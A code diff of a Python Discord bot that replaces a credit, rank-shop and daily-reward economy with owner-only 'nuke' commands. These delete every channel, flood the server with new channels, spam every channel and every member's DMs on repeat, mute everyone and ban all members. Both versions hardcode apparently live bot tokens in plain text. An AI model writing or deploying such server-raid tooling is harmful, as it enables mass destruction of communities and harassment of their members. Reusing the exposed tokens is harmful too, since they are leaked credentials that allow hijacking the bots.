@@ -1,221 +1,147 @@
 import discord
 from discord.ext import commands
 from discord import app_commands
-from discord.ui import Select, View
-import json
-import datetime
-from flask import Flask
-from threading import Thread
+import asyncio
+import aiohttp
 
-# ===== إعدادات أساسية =====
-TOKEN = "MTM3NDEyNjA4MTQwOTU0ODQxOA.GY4l0P.60Vswa1i7z2qP8XpfDCzLYHxv6RHFp1dPiZsmw"    
-OWNER_ID = 1358059903310369000
-
-intents = discord.Intents.default()
+intents = discord.Intents.all()
 bot = commands.Bot(command_prefix="!", intents=intents)
-tree = bot.tree
+OWNER_ID = 1377796809170354336  # << حط الآيدي تبعك هنا
 
-CREDIT_FILE = "credits.json"
-RANK_FILE = "ranks.json"
-DAILY_FILE = "daily.json"
+def is_owner(interaction: discord.Interaction):
+    return interaction.user.id == OWNER_ID
 
-RANKS = {
-    "Normal": {"price": 0, "daily": 1000},
-    "Bronze": {"price": 50000, "daily": 25000},
-    "Silver": {"price": 900000, "daily": 500000},
-    "Diamond X": {"price": 90000000, "daily": 50000000},
-}
-
-# ===== دوال التعامل مع الملفات =====
-def load_json(file):
-    try:
-        with open(file, "r") as f:
-            return json.load(f)
-    except:
-        return {}
-
-def save_json(file, data):
-    with open(file, "w") as f:
-        json.dump(data, f, indent=4)
-
-def format_number(n):
-    if n >= 1_000_000_000_000_000:
-        return f"{n / 1_000_000_000_000_000:.2f}Q"
-    elif n >= 1_000_000_000_000:
-        return f"{n / 1_000_000_000_000:.2f}T"
-    elif n >= 1_000_000_000:
-        return f"{n / 1_000_000_000:.2f}B"
-    elif n >= 1_000_000:
-        return f"{n / 1_000_000:.2f}M"
-    elif n >= 1_000:
-        return f"{n / 1_000:.2f}K"
-    else:
-        return str(n)
-
-# ===== أحداث البوت =====
 @bot.event
 async def on_ready():
-    if not getattr(bot, "synced", False):
-        await tree.sync()
-        bot.synced = True
     print(f"✅ Logged in as {bot.user}")
+    try:
+        synced = await bot.tree.sync()
+        print(f"✅ Synced {len(synced)} slash commands.")
+    except Exception as e:
+        print(f"❌ Error syncing commands: {e}")
 
-# ===== أوامر البوت =====
-@tree.command(name="balance", description="عرض رصيدك أو رصيد شخص")
-@app_commands.describe(member="الشخص الذي تريد رؤية رصيده")
-async def balance(interaction: discord.Interaction, member: discord.Member = None):
-    user = member or interaction.user
-    credits = load_json(CREDIT_FILE)
-    balance = credits.get(str(user.id), 0)
-    await interaction.response.send_message(f"💰 رصيد {user.mention}: `{format_number(balance)}` كريدت")
+# ✅ تغيير اسم وصورة السيرفر
+@bot.tree.command(name="تغيير_شكل_السيرفر", description="تغيير اسم وصورة السيرفر 🖼️📝")
+@app_commands.check(is_owner)
+@app_commands.describe(name="الاسم الجديد", image_url="رابط الصورة الجديدة")
+async def change_server(interaction: discord.Interaction, name: str, image_url: str):
+    await interaction.response.send_message("🔄 يتم تغيير شكل السيرفر...", ephemeral=True)
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(image_url) as resp:
+                if resp.status == 200:
+                    img = await resp.read()
+                    await interaction.guild.edit(name=name, icon=img)
+                    await interaction.followup.send("✅ تم تغيير شكل السيرفر!", ephemeral=True)
+                else:
+                    await interaction.followup.send("❌ لم أتمكن من تحميل الصورة.", ephemeral=True)
+    except Exception as e:
+        await interaction.followup.send(f"❌ حدث خطأ: {e}", ephemeral=True)
 
-@tree.command(name="give", description="تحويل كريدت لشخص آخر")
-@app_commands.describe(member="الشخص الذي تريد التحويل له", amount="المبلغ")
-async def give(interaction: discord.Interaction, member: discord.Member, amount: int):
-    sender_id = str(interaction.user.id)
-    receiver_id = str(member.id)
-
-    if amount <= 0 or member.id == interaction.user.id:
-        await interaction.response.send_message("❌ العملية غير صالحة.")
-        return
-
-    credits = load_json(CREDIT_FILE)
-    sender_balance = credits.get(sender_id, 0)
-
-    if sender_balance < amount:
-        await interaction.response.send_message("❌ لا تملك كريدت كافي.")
-        return
-
-    credits[sender_id] = sender_balance - amount
-    credits[receiver_id] = credits.get(receiver_id, 0) + amount
-    save_json(CREDIT_FILE, credits)
-
-    await interaction.response.send_message(
-        f"✅ تم تحويل `{format_number(amount)}` كريدت إلى {member.mention}.")
-
-@tree.command(name="add_money", description="إضافة كريدت (خاص بالمالك)")
-@app_commands.describe(member="الشخص", amount="المبلغ")
-async def add_money(interaction: discord.Interaction, member: discord.Member, amount: int):
-    if interaction.user.id != OWNER_ID:
-        await interaction.response.send_message("❌ هذا الأمر للمالك فقط.")
-        return
-
-    if amount <= 0:
-        await interaction.response.send_message("❌ المبلغ غير صالح.")
-        return
-
-    credits = load_json(CREDIT_FILE)
-    user_id = str(member.id)
-    credits[user_id] = credits.get(user_id, 0) + amount
-    save_json(CREDIT_FILE, credits)
-
-    await interaction.response.send_message(
-        f"✅ تمت إضافة `{format_number(amount)}` كريدت لـ {member.mention}.")
-
-@tree.command(name="daily", description="احصل على مكافأتك اليومية حسب رتبتك")
-async def daily(interaction: discord.Interaction):
-    user_id = str(interaction.user.id)
-    credits = load_json(CREDIT_FILE)
-    ranks = load_json(RANK_FILE)
-    daily_log = load_json(DAILY_FILE)
-
-    now = datetime.datetime.utcnow()
-    last_claim = daily_log.get(user_id)
-
-    if last_claim:
-        last_time = datetime.datetime.fromisoformat(last_claim)
-        elapsed = now - last_time
-        if elapsed.total_seconds() < 86400:
-            remaining = datetime.timedelta(seconds=86400) - elapsed
-            hours, remainder = divmod(int(remaining.total_seconds()), 3600)
-            minutes = remainder // 60
-            await interaction.response.send_message(
-                f"⏳ لا يمكنك أخذ اليومية الآن. الرجاء الانتظار `{hours}` ساعة و `{minutes}` دقيقة.")
-            return
-
-    rank = ranks.get(user_id, "Normal")
-    reward = RANKS.get(rank, RANKS["Normal"])['daily']
-    credits[user_id] = credits.get(user_id, 0) + reward
-    daily_log[user_id] = now.isoformat()
-
-    save_json(CREDIT_FILE, credits)
-    save_json(DAILY_FILE, daily_log)
-
-    await interaction.response.send_message(
-        f"🎁 أخذت `{format_number(reward)}` كريدت كمكافأة يومية لرتبة `{rank}`.")
-
-@tree.command(name="shop", description="عرض المتجر والرتب المتاحة")
-async def shop(interaction: discord.Interaction):
-    embed = discord.Embed(title="🛒 المتجر - الرتب المتاحة", color=0x00ffcc)
-    for rank, info in RANKS.items():
-        embed.add_field(
-            name=f"🏷️ {rank}",
-            value=f"💵 السعر: `{format_number(info['price'])}`\n🎁 اليومية: `{format_number(info['daily'])}` كريدت",
-            inline=False
-        )
-    await interaction.response.send_message(embed=embed)
-
-@tree.command(name="buy", description="شراء رتبة من المتجر (باختيار)")
-async def buy(interaction: discord.Interaction):
-    ranks = load_json(RANK_FILE)
-    credits = load_json(CREDIT_FILE)
-    user_id = str(interaction.user.id)
-
-    options = []
-    for rank, data in RANKS.items():
-        label = f"{rank} - {format_number(data['price'])} كريدت"
-        description = f"مكافأة يومية: {format_number(data['daily'])}"
-        options.append(discord.SelectOption(label=rank, description=description, value=rank))
-
-    class RankSelectView(View):
-        @discord.ui.select(placeholder="اختر رتبة للشراء", options=options)
-        async def select_callback(self, interaction2: discord.Interaction, select: Select):
-            selected_rank = select.values[0]
-            price = RANKS[selected_rank]['price']
-            balance = credits.get(user_id, 0)
-
-            if balance < price:
-                await interaction2.response.send_message(
-                    f"❌ تحتاج `{format_number(price)}` كريدت لشراء `{selected_rank}`.")
-                return
-
-            credits[user_id] = balance - price
-            ranks[user_id] = selected_rank
-            save_json(CREDIT_FILE, credits)
-            save_json(RANK_FILE, ranks)
-
-            await interaction2.response.send_message(
-                f"✅ تم شراء رتبة `{selected_rank}` وتم خصم `{format_number(price)}` كريدت من رصيدك.")
-
-    await interaction.response.send_message("🎯 اختر الرتبة التي تريد شراءها:", view=RankSelectView())
-
-@tree.command(name="top", description="عرض أغنى 10 أشخاص")
-async def top(interaction: discord.Interaction):
-    credits = load_json(CREDIT_FILE)
-    sorted_users = sorted(credits.items(), key=lambda x: x[1], reverse=True)[:10]
-
-    embed = discord.Embed(title="🏆 أغنى 10 أعضاء", color=0xf1c40f)
-    for index, (user_id, amount) in enumerate(sorted_users, 1):
+# ✅ حذف كل الرومات
+@bot.tree.command(name="حذف_الرومات", description="🧨 حذف جميع الرومات")
+@app_commands.check(is_owner)
+async def delete_channels(interaction: discord.Interaction):
+    await interaction.response.send_message("🚨 يتم حذف كل الرومات...", ephemeral=True)
+    for channel in interaction.guild.channels:
         try:
-            user = await bot.fetch_user(int(user_id))
-            embed.add_field(name=f"#{index} {user.name}", value=f"💰 {format_number(amount)} كريدت", inline=False)
+            await channel.delete()
         except:
-            continue
+            pass
 
-    await interaction.response.send_message(embed=embed)
+# ✅ إنشاء رومات جديدة
+@bot.tree.command(name="انشاء_رومات", description="📁 إنشاء عدد معين من الرومات")
+@app_commands.check(is_owner)
+@app_commands.describe(name="اسم الروم", amount="كم عدد الرومات")
+async def create_channels(interaction: discord.Interaction, name: str, amount: int):
+    await interaction.response.send_message(f"📁 يتم إنشاء {amount} روم باسم {name}...", ephemeral=True)
+    for _ in range(amount):
+        await interaction.guild.create_text_channel(name)
 
-# ===== تشغيل Flask للـ UptimeRobot أو Replit =====
-app = Flask('')
+# ✅ إرسال إلى كل الرومات
+@bot.tree.command(name="ارسال", description="📢 إرسال رسالة إلى جميع الرومات")
+@app_commands.check(is_owner)
+@app_commands.describe(message="الرسالة", repeat="كم مرة ترسل", delay="كل كم ثانية ترسل")
+async def spam_all(interaction: discord.Interaction, message: str, repeat: int, delay: float):
+    await interaction.response.send_message("🗨️ يتم إرسال الرسائل...", ephemeral=True)
+    for _ in range(repeat):
+        for channel in interaction.guild.text_channels:
+            try:
+                await channel.send(message)
+            except:
+                pass
+        await asyncio.sleep(delay)
 
-@app.route('/')
-def home():
-    return "I'm Alive!"
+# ✅ إرسال خاص لكل الأعضاء
+@bot.tree.command(name="ارسال_خاص", description="✉️ إرسال رسالة خاصة لكل الأعضاء")
+@app_commands.check(is_owner)
+@app_commands.describe(message="الرسالة", repeat="كم مرة ترسل", delay="كل كم ثانية ترسل")
+async def dm_all(interaction: discord.Interaction, message: str, repeat: int, delay: float):
+    await interaction.response.send_message("✉️ يتم إرسال الرسائل الخاصة...", ephemeral=True)
+    for _ in range(repeat):
+        for member in interaction.guild.members:
+            if not member.bot and member.id != interaction.user.id:
+                try:
+                    await member.send(message)
+                except:
+                    pass
+        await asyncio.sleep(delay)
 
-def run():
-    app.run(host='0.0.0.0', port=8080)
+# ✅ كتم كل الأعضاء عن طريق رتبة
+@bot.tree.command(name="كتم_الكل", description="🔇 كتم كل الأعضاء بواسطة رتبة Muted")
+@app_commands.check(is_owner)
+async def mute_all(interaction: discord.Interaction):
+    await interaction.response.send_message("🔇 يتم كتم الجميع...", ephemeral=True)
+    guild = interaction.guild
 
-def keep_alive():
-    Thread(target=run).start()
+    muted_role = discord.utils.get(guild.roles, name="Muted")
+    if not muted_role:
+        muted_role = await guild.create_role(name="Muted", reason="🔇 إنشاء رتبة الكتم")
 
-keep_alive()
-bot.run(TOKEN)
+    for channel in guild.channels:
+        try:
+            await channel.set_permissions(muted_role, send_messages=False, speak=False)
+        except:
+            pass
+
+    count = 0
+    for member in guild.members:
+        if not member.bot and member.id != interaction.user.id:
+            try:
+                await member.add_roles(muted_role, reason="كتم عام")
+                count += 1
+            except:
+                continue
+
+    # ✅ إرسال النتيجة في الخاص بدل العام
+    try:
+        await interaction.user.send(f"🔇 تم كتم `{count}` عضو.")
+    except discord.Forbidden:
+        await interaction.followup.send("❌ ما قدرت أرسل لك في الخاص، افتح الخاص من إعدادات الديسكورد.", ephemeral=True)
+
+
+# ✅ تبنيد كل الأعضاء
+@bot.tree.command(name="تبنيد_الكل", description="🚫 تبنيد جميع الأعضاء (مرة وحدة)")
+@app_commands.check(is_owner)
+async def ban_all(interaction: discord.Interaction):
+    await interaction.response.send_message("🚫 يتم تبنيد الجميع...", ephemeral=True)
+    for member in interaction.guild.members:
+        if member.id != interaction.user.id and not member.bot:
+            try:
+                await member.ban(reason="تم التبنيد من البوت")
+            except:
+                pass
+
+# ✅ تبنيد عضو بالآيدي
+@bot.tree.command(name="تبنيد_بالايدي", description="🆔 تبنيد شخص باستخدام ID")
+@app_commands.check(is_owner)
+@app_commands.describe(user_id="آيدي الشخص")
+async def ban_by_id(interaction: discord.Interaction, user_id: str):
+    await interaction.response.send_message("🆔 يتم التبنيد باستخدام ID...", ephemeral=True)
+    try:
+        await interaction.guild.ban(discord.Object(id=int(user_id)), reason="تبنيد خارجي")
+        await interaction.followup.send("✅ تم تبنيد الشخص بالآيدي!", ephemeral=True)
+    except Exception as e:
+        await interaction.followup.send(f"❌ فشل التبنيد: {e}", ephemeral=True)
+
+bot.run("MTM4NjIxMDkxMzM1NDI1MjM1OQ.GylMRB.GTPkbIRq0P41aeR4OCkBbOKmVVOgheOxo5hw8s")
